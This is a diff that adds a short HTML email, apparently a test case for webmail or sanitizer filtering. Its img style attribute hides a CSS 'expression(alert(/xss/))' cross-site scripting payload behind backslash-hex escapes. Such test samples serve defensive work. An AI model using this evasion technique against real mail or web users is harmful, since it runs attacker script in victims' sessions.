@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: iamxss
+To: victim@21cn.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<img src="http://www.yahoo.com/a.jpg" style="top:\0065\0078\0070\0072\0065\0073\0073\0069\006f\006e\0028\0061\006c\0065\0072\0074\0028\002f\0078\0073\0073\002f\0029\0029;">
